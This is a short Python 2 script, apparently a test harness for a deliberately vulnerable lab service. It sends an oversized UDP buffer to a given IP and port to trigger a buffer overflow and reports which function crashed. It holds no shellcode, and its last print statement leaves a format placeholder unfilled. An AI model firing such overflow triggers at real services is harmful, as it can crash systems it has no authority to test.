#!/usr/bin/python
from socket import *
from reporter import *
import sys

def exploit(ip, port):
	reporter = reporter_init()

	# Create the socket
	s = socket(AF_INET, SOCK_DGRAM)

	# Connect to the target
	s.connect((ip, port))

	# Send a big buffer
	s.send("a" * 1400)

	return reporter_wait(reporter)

if __name__ == "__main__":
	if len(sys.argv) != 3:
		print "Simple BOF exploit"
		print "Usage: %s <IP Address> <SIMPLE recv Port>" % sys.argv[0]

		exit(0)

	s = exploit(sys.argv[1], int(sys.argv[2]))

	if s == "" or s == "main":
		print "Exploit success"
	else:
		print "Reported function: %s"
